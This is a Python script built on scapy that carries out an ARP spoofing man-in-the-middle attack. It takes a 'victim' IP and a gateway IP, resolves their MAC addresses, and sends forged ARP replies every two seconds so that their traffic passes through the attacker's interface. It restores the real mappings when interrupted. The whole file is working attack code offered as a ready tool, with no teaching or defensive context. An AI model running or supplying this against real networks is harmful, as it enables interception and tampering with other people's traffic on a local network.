from scapy.all import ARP, Ether, srp, sendp, get_if_hwaddr
import time
import signal, sys
import ipaddress
import argparse
import re


def get_mac(ip):
    arp_request = ARP(pdst=ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff") 
    packet = ether / arp_request  
    result = srp(packet, timeout=2, verbose=0)[0]
    for sent, received in result:
        return received.hwsrc

def valid_ip(s):
    try:
        ipaddress.ip_address(s)
        return s
    except ValueError:
        raise argparse.ArgumentTypeError(f"Invalid IP address: {s}")


def valid_mac(s):
    _mac_re = re.compile(r"^[0-9a-f]{2}(:[0-9a-f]{2}){5}$", re.I)
    if _mac_re.match(s):
        return s.lower()
    raise argparse.ArgumentTypeError(f"Invalid MAC address: {s}")

# --- argparse setup ---
parser = argparse.ArgumentParser(
    description="ARP spoofing"
)
parser.add_argument(
    "-t", "--target", type=valid_ip, help="Target IP (victim)"
)
parser.add_argument(
    "-g", "--gateway", type=valid_ip, help="Gateway IP"
)
parser.add_argument(
    "-i", "--iface", default="wlan0", help="Interface to use (default: wlan0)"
)
parser.add_argument(
    "--target-mac", type=valid_mac, default=None, help="Target MAC (optional; resolved if not provided)"
)
parser.add_argument(
    "--gateway-mac", type=valid_mac, default=None, help="Gateway MAC (optional; resolved if not provided)"
)

args = parser.parse_args()

gateway_ip = args.gateway
target_ip = args.target
iface = args.iface
target_mac = get_mac(target_ip)
gateway_mac = get_mac(gateway_ip)
own_mac = get_if_hwaddr(iface)

target_mac = args.target_mac or get_mac(target_ip)
if not target_mac:
    raise SystemExit(f"Could not resolve MAC for target {target_ip} (try providing --target-mac)")

gateway_mac = args.gateway_mac or get_mac(gateway_ip)
if not gateway_mac:
    raise SystemExit(f"Could not resolve MAC for gateway {gateway_ip} (try providing --gateway-mac)")

if not target_mac:
    print("ERROR: Failed to get the MAC address of victim IP. Verify they are up. ")
    sys.exit(1)


def spoofing_arp(target_ip):    
        target_arp_response = Ether(dst=target_mac, src=own_mac) / ARP(
            op=2,
            psrc=gateway_ip,
            pdst=target_ip,
            hwsrc=own_mac,
            hwdst=target_mac
        )

        gateway_arp_response = Ether(dst=gateway_mac, src=own_mac) / ARP(
            op=2,
            psrc=target_ip,
            pdst=gateway_ip,
            hwsrc=own_mac,
            hwdst=gateway_mac
        )

        while True:
            print("Sending spoofed ARP packets...")
            sendp(target_arp_response, iface=iface, verbose=0)
            sendp(gateway_arp_response, iface=iface, verbose=0)
            time.sleep(2)


def start_spoofing():
    if target_ip:
        print("Beginning attack...\n")
        spoofing_arp(target_ip)

def cleanup(signum, frame):
    print("\nExiting...")
    real_to_victim = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    real_to_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac)
    for _ in range(4):
        # We reset the correct mapping of MAC/IP to re-establish connection to the victim
        sendp(Ether(dst=target_mac, src=gateway_mac)/real_to_victim, iface=iface, verbose=0)
        sendp(Ether(dst=gateway_mac, src=target_mac)/real_to_gateway, iface=iface, verbose=0)
        time.sleep(1)
    sys.exit(0)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

start_spoofing()


